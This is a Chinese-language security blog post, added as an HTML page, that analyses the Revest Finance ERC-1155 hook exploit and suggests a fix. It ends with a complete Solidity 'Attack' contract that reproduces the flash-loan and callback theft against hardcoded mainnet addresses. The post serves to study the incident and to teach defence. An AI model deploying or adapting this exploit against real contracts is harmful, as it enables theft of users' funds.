@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>revest finance漏洞--nft的重入攻击？ | SCS</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="keywords" content="复盘分析、合约设计漏洞、ERC-1155" />
+  
+  
+  
+  
+  <meta name="description" content="问题背景 Revest Finance 提出了一种将可替代的 ERC-20 代币作为不可替代的代币化金融工具，对ERC-20进行打包、转移和存储，利用 ERC-1155 非可替代代币（NFT）标准来简化访问和商业通用性。使用该产品，资产的所有权可以以不影响资产价值的方式进行交易，从而形成一个新的商业模式。通过有针对性的用例发现该协议的机制、治理和货币化。 Revest Finance 的金融不可">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Revest Finance漏洞--NFT的重入攻击？">
+<meta property="og:url" content="http://example.com/2022/04/02/Revest_Finance%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="SCS">
+<meta property="og:description" content="问题背景 Revest Finance 提出了一种将可替代的 ERC-20 代币作为不可替代的代币化金融工具，对ERC-20进行打包、转移和存储，利用 ERC-1155 非可替代代币（NFT）标准来简化访问和商业通用性。使用该产品，资产的所有权可以以不影响资产价值的方式进行交易，从而形成一个新的商业模式。通过有针对性的用例发现该协议的机制、治理和货币化。 Revest Finance 的金融不可">
+<meta property="og:locale">
+<meta property="og:image" content="http://example.com/2022/04/02/Revest_Finance%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/1_lnsPt60ATtVIop0OBcqx5Q.png">
+<meta property="og:image" content="http://example.com/2022/04/02/Revest_Finance%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image_02_15-07-10.png">
+<meta property="og:image" content="http://example.com/2022/04/02/Revest_Finance%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image_02_16-36-25.png">
+<meta property="og:image" content="http://example.com/2022/04/02/Revest_Finance%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image_02_16-58-05.png">
+<meta property="og:image" content="http://example.com/2022/04/02/Revest_Finance%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/Snipaste_2022-04-01_22-03-49.png">
+<meta property="og:image" content="http://example.com/2022/04/02/Revest_Finance%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image_02_16-18-51.png">
+<meta property="og:image" content="http://example.com/2022/04/02/Revest_Finance%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image_02_16-19-38.png">
+<meta property="og:image" content="http://example.com/2022/04/02/Revest_Finance%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image_02_17-10-27.png">
+<meta property="og:image" content="http://example.com/2022/04/02/Revest_Finance%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image_02_17-34-12.png">
+<meta property="og:image" content="http://example.com/2022/04/02/Revest_Finance%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image_02_14-53-58.png">
+<meta property="article:published_time" content="2022-04-02T02:42:40.000Z">
+<meta property="article:modified_time" content="2022-04-02T10:01:08.736Z">
+<meta property="article:author" content="Janson Woods">
+<meta property="article:tag" content="复盘分析、合约设计漏洞、ERC-1155">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/04/02/Revest_Finance%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/1_lnsPt60ATtVIop0OBcqx5Q.png">
+  
+
+  
+
+  <link rel="icon" href="/css/images/mylogo.jpg">
+  <link rel="apple-touch-icon" href="/css/images/mylogo.jpg">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt; src:url("/css/fonts/FuturaPTBold.otf") format("woff");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt-light; src:url("/css/fonts/FuturaPTBook.otf") format("woff");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt-italic; src:url("/css/fonts/FuturaPTBookOblique.otf") format("woff");font-weight:400;font-style:italic;}
+}
+
+  </style>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+<script src="/js/jquery-3.1.1.min.js"></script>
+
+  
+<script src="/js/bootstrap.js"></script>
+
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+
+  
+    
+<link rel="stylesheet" href="/css/dialog.css">
+
+  
+
+  
+
+  
+    <link rel="stylesheet" href="/css/header-post.css" >
+  
+
+  
+  
+  
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+  <div id="container">
+    <div id="wrap">
+      
+        <header>
+
+    <div id="allheader" class="navbar navbar-default navbar-static-top" role="navigation">
+        <div class="navbar-inner">
+          
+          <div class="container"> 
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+              <span class="sr-only">Toggle navigation</span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+
+            
+              <a class="brand" style="
+                 margin-top: 0px;"  
+                href="#" data-toggle="modal" data-target="#myModal" >
+                  <img width="124px" height="124px" alt="Hike News" src="/css/images/mylogo.jpg">
+              </a>
+            
+            
+            <div class="navbar-collapse collapse">
+              <ul class="hnav navbar-nav">
+                
+                  <li> <a class="main-nav-link" href="/">Home</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/archives">Archives</a> </li>
+                
+                  <li><div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+</div></li>
+            </div>
+          </div>
+                
+      </div>
+    </div>
+
+</header>
+
+
+
+      
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-Revest_Finance重入漏洞" style="width: 75%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" class="article-title" itemprop="name">
+      Revest Finance漏洞--NFT的重入攻击？
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2022/04/02/Revest_Finance%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+	  <time datetime="2022-04-02T02:42:40.000Z" itemprop="datePublished">2022-04-02</time>
+	</a>
+
+      
+      
+	<a class="article-views">
+	<span id="busuanzi_container_page_pv">
+		PV:<span id="busuanzi_value_page_pv"></span>
+	</span>
+	</a>
+
+      
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><img src="/2022/04/02/Revest_Finance%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/1_lnsPt60ATtVIop0OBcqx5Q.png" alt="1_lnsPt60ATtVIop0OBcqx5Q"></p>
+<h2 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h2><p><img src="/2022/04/02/Revest_Finance%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image_02_15-07-10.png" alt="image_02_15-07-10"></p>
+<p>Revest Finance 提出了一种将可替代的 ERC-20 代币作为不可替代的代币化金融工具，对ERC-20进行打包、转移和存储，利用 ERC-1155 非可替代代币（NFT）标准来简化访问和商业通用性。使用该产品，资产的所有权可以以不影响资产价值的方式进行交易，从而形成一个新的商业模式。通过有针对性的用例发现该协议的机制、治理和货币化。</p>
+<p>Revest Finance 的金融不可替代代币 (FNFT) 使未来权利对锁定资产的无信任转移成为可能。入口合约（<a target="_blank" rel="noopener" href="https://etherscan.io/address/0x2320a28f52334d62622cc2eafa15de55f9987ed9"><em>Revest</em>合约</a>）锁定标的资产利用三种不同的接口并铸造 FNFT：</p>
+<ul>
+<li><code>mintTimeLock</code>: 标的资产将在一段时间后解锁。</li>
+<li><code>mintValueLock</code>：当标的资产的价值高于或低于规定值时，标的资产将被解锁。</li>
+<li><code>mintAddressLock</code>: 标的资产将通过指定账户解锁。</li>
+</ul>
+<p><em>Revest</em>合约与其他三个合约连接以锁定和解锁基础资产。</p>
+<h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>攻击交易哈希：</p>
+<p><a target="_blank" rel="noopener" href="https://etherscan.io/tx/0xe0b0c2672b760bef4e2851e91c69c8c0ad135c6987bbf1f43f5846d89e691428">https://etherscan.io/tx/0xe0b0c2672b760bef4e2851e91c69c8c0ad135c6987bbf1f43f5846d89e691428</a></p>
+<p><img src="/2022/04/02/Revest_Finance%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image_02_16-36-25.png" alt="image_02_16-36-25"></p>
+<p><img src="/2022/04/02/Revest_Finance%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image_02_16-58-05.png" alt="image_02_16-58-05"></p>
+<h2 id="攻击核心"><a href="#攻击核心" class="headerlink" title="攻击核心"></a>攻击核心</h2><p>本次攻击中主要是利用了<strong>mintAddressLock</strong>类型的 <a target="_blank" rel="noopener" href="https://etherscan.io/address/0xb480ac726528d1c195cd3bb32f19c92e8d928519#code">onERC1155Received</a>的钩子函数设计与<strong>depositAdditionalToFNFT</strong>接口的结合，在handleMultipleDeposit函数中利用FNFT（1027）config的depositAmount值(1e18)，使FNFT（1028）的depositAmount值由原本的0更新为1e18。</p>
+<p><img src="/2022/04/02/Revest_Finance%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/Snipaste_2022-04-01_22-03-49.png" alt="Snipaste_2022-04-01_22-03-49"></p>
+<p><img src="/2022/04/02/Revest_Finance%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image_02_16-18-51.png" alt="image_02_16-18-51"></p>
+<p><img src="/2022/04/02/Revest_Finance%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image_02_16-19-38.png" alt="image_02_16-19-38"></p>
+<p><img src="/2022/04/02/Revest_Finance%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image_02_17-10-27.png" alt="image_02_17-10-27"></p>
+<p>攻击者在withdrawFNFT赎回360001个FNFT（1028）时算出360001*1e18个RENA代币，完成获利。</p>
+<h3 id="要点1"><a href="#要点1" class="headerlink" title="要点1"></a>要点1</h3><p>1个价值1个REANA的fnft（1027）转移到360000个价值为0个RENA的fnft（1028）时，直接将fnft（1027）的config赋值给将fnft（1028）的config，导致360000fnft（1028）的价值为360000个RENA！（原本价值为0个RENA）</p>
+<h3 id="要点2"><a href="#要点2" class="headerlink" title="要点2"></a>要点2</h3><p>在分析交易时一直有个疑问：第一次的 <a target="_blank" rel="noopener" href="https://etherscan.io/address/0xb480ac726528d1c195cd3bb32f19c92e8d928519#code">onERC1155Received</a>回调并没有进行任何操作，在第二次回调时调用depositAdditionalToFNFT，发起攻击？（为什么两次回调内容并不相同？）</p>
+<p><img src="/2022/04/02/Revest_Finance%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image_02_17-34-12.png" alt="image_02_17-34-12"></p>
+<p>通过攻击合约反编译可知，使用布尔类型的_onERC1155Received变量来实现不同分支的函数调用，具体可在复现代码的onERC1155Received函数中查看。</p>
+<h2 id="修改建议"><a href="#修改建议" class="headerlink" title="修改建议"></a>修改建议</h2><p>增加<strong>handleMultipleDeposit</strong>函数中newFNFT的参数校验机制，再将旧的FNFT转存在新的newFNFT时，应重新计算newFNFT的config的参数，确保在价值传递过程中的等价性。</p>
+<p>个人认为该漏洞并不属于严格意义上的二重入攻击，该漏洞巧妙地使用ERC-1155的钩子函数设计结合<strong>depositAdditionalToFNFT</strong>函数逻辑上设计的缺陷，绕过权限的界定完成fnft（1028）的config.depositAmount的值的更改（0-&gt;1e18）,从中获利。并没有出现重新进入某一特定函数的情况，个人认为不属于NFT的重入攻击(欢迎评论区讨论)。</p>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.4</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;hardhat/console.sol&quot;</span>;</span><br><span class="line">interface ERC1820Registry &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setInterfaceImplementer</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">        address _addr,</span></span></span><br><span class="line"><span class="params"><span class="function">        bytes32 _interfaceHash,</span></span></span><br><span class="line"><span class="params"><span class="function">        address _implementer</span></span></span><br><span class="line"><span class="params"><span class="function">    </span>) <span class="title">external</span></span>;</span><br><span class="line">&#125;</span><br><span class="line">interface Rena &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">approve</span>(<span class="params">address spender, uint256 amount</span>) <span class="title">external</span> <span class="title">returns</span> (<span class="params">bool</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address account</span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint256</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address recipient, uint256 amount</span>)</span></span><br><span class="line"><span class="function">        <span class="title">external</span></span></span><br><span class="line"><span class="function">        <span class="title">returns</span> (<span class="params">bool</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transferFrom</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">        address sender,</span></span></span><br><span class="line"><span class="params"><span class="function">        address recipient,</span></span></span><br><span class="line"><span class="params"><span class="function">        uint256 amount</span></span></span><br><span class="line"><span class="params"><span class="function">    </span>) <span class="title">external</span> <span class="title">returns</span> (<span class="params">bool</span>)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">interface Uniswap_RENA  &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">swap</span>(<span class="params"> uint256 amount0Out,uint256 amount1Out,address to,bytes memory data </span>) <span class="title">external</span>   </span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">interface  Revest &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">depositAdditionalToFNFT</span>(<span class="params"> uint256 fnftId,uint256 amount,uint256 quantity </span>) <span class="title">external</span>  <span class="title">returns</span> (<span class="params">uint256 </span>) </span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">mintAddressLock</span>(<span class="params"> address trigger,bytes memory <span class="built_in">arguments</span>,address[] memory recipients,uint256[] memory quantities,IRevest.FNFTConfig memory fnftConfig </span>) <span class="title">external</span> <span class="title">payable</span> <span class="title">returns</span> (<span class="params">uint256 </span>) </span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdrawFNFT</span>(<span class="params"> uint256 fnftId,uint256 quantity </span>) <span class="title">external</span>   </span>;</span><br><span class="line">&#125;</span><br><span class="line">interface IRevest &#123;</span><br><span class="line">    struct FNFTConfig &#123; address asset;</span><br><span class="line">    address pipeToContract;</span><br><span class="line">    uint256 depositAmount;</span><br><span class="line">    uint256 depositMul;</span><br><span class="line">    uint256 split;</span><br><span class="line">    uint256 depositStopTime;</span><br><span class="line">    bool maturityExtension;</span><br><span class="line">    bool isMulti;</span><br><span class="line">    bool nontransferrable; &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack&#123;</span><br><span class="line">    address eRC1820Registry = <span class="number">0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24</span>;</span><br><span class="line">    address rena = <span class="number">0x56de8BC61346321D4F2211e3aC3c0A7F00dB9b76</span>;</span><br><span class="line">    address swap = <span class="number">0xbC2C5392b0B841832bEC8b9C30747BADdA7b70ca</span>;</span><br><span class="line">    address revest = <span class="number">0x2320A28f52334d62622cc2EaFa15DE55F9987eD9</span>;</span><br><span class="line">    uint public lock = <span class="number">0</span>;</span><br><span class="line">    bool first = <span class="literal">false</span>;</span><br><span class="line">    uint nft_id;</span><br><span class="line">    IRevest.FNFTConfig fnftConfig;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        bytes32 hash = <span class="number">0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895</span>;</span><br><span class="line">        ERC1820Registry(eRC1820Registry).setInterfaceImplementer(address(<span class="built_in">this</span>),hash,address(<span class="built_in">this</span>));</span><br><span class="line">        Rena(rena).approve(revest,type(uint256).max);</span><br><span class="line">        uint Rena_amount = <span class="number">2</span>*<span class="number">1e18</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;1.flash loan 2 Rena&quot;</span>);</span><br><span class="line">        Uniswap_RENA(swap).swap(Rena_amount,<span class="number">0</span>,address(<span class="built_in">this</span>),<span class="string">&#x27;0x78&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">uniswapV2Call</span>(<span class="params">address _sender,uint256 _amount0,uint256 _amount1,bytes calldata _data</span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        fnftConfig.asset = rena;</span><br><span class="line">        fnftConfig.pipeToContract = <span class="number">0x0000000000000000000000000000000000000000</span>;</span><br><span class="line">        fnftConfig.depositAmount = <span class="number">0</span>;</span><br><span class="line">        fnftConfig.depositMul = <span class="number">0</span>;</span><br><span class="line">        fnftConfig.split = <span class="number">0</span>;</span><br><span class="line">        fnftConfig.depositStopTime = <span class="number">0</span>;</span><br><span class="line">        fnftConfig.maturityExtension = <span class="literal">false</span>;</span><br><span class="line">        fnftConfig.isMulti = <span class="literal">true</span>;</span><br><span class="line">        fnftConfig.nontransferrable = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        address[] memory recipients = <span class="keyword">new</span> address[](<span class="number">1</span>);</span><br><span class="line">        uint256[] memory quantities = <span class="keyword">new</span> uint256[](<span class="number">1</span>);</span><br><span class="line">        recipients[<span class="number">0</span>] = address(<span class="built_in">this</span>);</span><br><span class="line">        quantities[<span class="number">0</span>] = uint256(<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;2.Get 2 fnft(1027)&quot;</span>);</span><br><span class="line">        nft_id = Revest(revest).mintAddressLock(address(<span class="built_in">this</span>),<span class="string">&#x27;0x&#x27;</span>,recipients,quantities,fnftConfig);</span><br><span class="line">        quantities[<span class="number">0</span>] = uint256(<span class="number">360000</span>);</span><br><span class="line">        lock = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;3.Get 360000 fnft(1028)&quot;</span>);</span><br><span class="line">        Revest(revest).mintAddressLock(address(<span class="built_in">this</span>),<span class="string">&#x27;0x&#x27;</span>,recipients,quantities,fnftConfig);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;4.withdraw 360001 fnft(1028)&quot;</span>);</span><br><span class="line">        Revest(revest).withdrawFNFT(nft_id+<span class="number">1</span>,<span class="number">360001</span>);</span><br><span class="line">        uint amount = (_amount0/<span class="number">997</span>*<span class="number">1000</span>/<span class="number">99</span>*<span class="number">100</span>)+<span class="number">1000</span>;</span><br><span class="line">        Rena(rena).transfer(swap,amount);</span><br><span class="line">        uint balance = Rena(rena).balanceOf(address(<span class="built_in">this</span>));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;End,Attacker&#x27;s RENA balance:&quot;</span>,balance / <span class="number">1</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">onERC1155Received</span>(<span class="params">address operator,address <span class="keyword">from</span>,uint256 id,uint256 value,bytes calldata data</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bytes4</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (lock == <span class="number">1</span> &amp;&amp; !first)&#123;</span><br><span class="line">            first = <span class="literal">true</span>;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;3.1 deposit 1 fnft(1027) to fnft(1028)&quot;</span>);</span><br><span class="line">            Revest(revest).depositAdditionalToFNFT(<span class="number">1027</span>,<span class="number">1e18</span>,<span class="number">1</span>);&#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.onERC1155Received.selector;</span><br><span class="line">    &#125;</span><br><span class="line">   receive() payable external&#123;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>复现截图</p>
+<p><img src="/2022/04/02/Revest_Finance%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image_02_14-53-58.png" alt="image_02_14-53-58"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      <div>
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+          <strong>Post author:  </strong>Janson Woods</a>
+          </li>
+          <li class="post-copyright-link">
+          <strong>Post link:  </strong>
+          <a href="/2022/04/02/Revest_Finance重入漏洞/" target="_blank" title="Revest Finance漏洞--NFT的重入攻击？">http://example.com/2022/04/02/Revest_Finance重入漏洞/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>Copyright Notice:   </strong>
+            All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+            unless stating additionally.
+          </li>
+         
+        </ul>
+<div>
+
+      
+      
+        
+	<div id="comment">
+		<!-- 来必力City版安装代码 -->
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
+		<script type="text/javascript">
+		   (function(d, s) {
+		       var j, e = d.getElementsByTagName(s)[0];
+
+		       if (typeof LivereTower === 'function') { return; }
+
+		       j = d.createElement(s);
+		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+		       j.async = true;
+
+		       e.parentNode.insertBefore(j, e);
+		   })(document, 'script');
+		</script>
+		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+		</div>
+		<!-- City版安装代码已完成 -->
+	</div>
+
+
+
+      
+      
+        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%A4%8D%E7%9B%98%E5%88%86%E6%9E%90%E3%80%81%E5%90%88%E7%BA%A6%E8%AE%BE%E8%AE%A1%E6%BC%8F%E6%B4%9E%E3%80%81ERC-1155/" rel="tag">复盘分析、合约设计漏洞、ERC-1155</a></li></ul>
+
+      
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2022/03/27/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E7%AC%AC%E4%B8%80%E6%AD%A5/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">智能合约安全审计第一步：向“public burn”说NO！</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="toc-sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
+    
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%97%AE%E9%A2%98%E8%83%8C%E6%99%AF"><span class="nav-number">1.</span> <span class="nav-text">问题背景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="nav-number">2.</span> <span class="nav-text">攻击流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%A0%B8%E5%BF%83"><span class="nav-number">3.</span> <span class="nav-text">攻击核心</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A6%81%E7%82%B91"><span class="nav-number">3.1.</span> <span class="nav-text">要点1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A6%81%E7%82%B92"><span class="nav-number">3.2.</span> <span class="nav-text">要点2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9%E5%BB%BA%E8%AE%AE"><span class="nav-number">4.</span> <span class="nav-text">修改建议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0"><span class="nav-number">5.</span> <span class="nav-text">复现</span></a></li></ol>
+    
+    </div>
+  </aside>
+
+</section>
+        
+      </div>
+      
+      <footer id="footer">
+  
+
+  <div class="container">
+      	<div class="row">
+	      <p> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/iTimeTraveler/hexo-theme-hiker" target="_blank">Hexo-theme-hiker</a> </p>
+	      <p id="copyRightEn">Copyright &copy; 2013 - 2022 SCS All Rights Reserved.</p>
+	      
+	      
+    		<p class="busuanzi_uv">
+				UV : <span id="busuanzi_value_site_uv"></span> |  
+				PV : <span id="busuanzi_value_site_pv"></span>
+		    </p>
+  		   
+		</div>
+
+		
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+    var allheader = document.getElementById("allheader");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
+    if (allheader != null) {
+      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    } else {
+      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    }
+</script>
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav> -->
+    
+
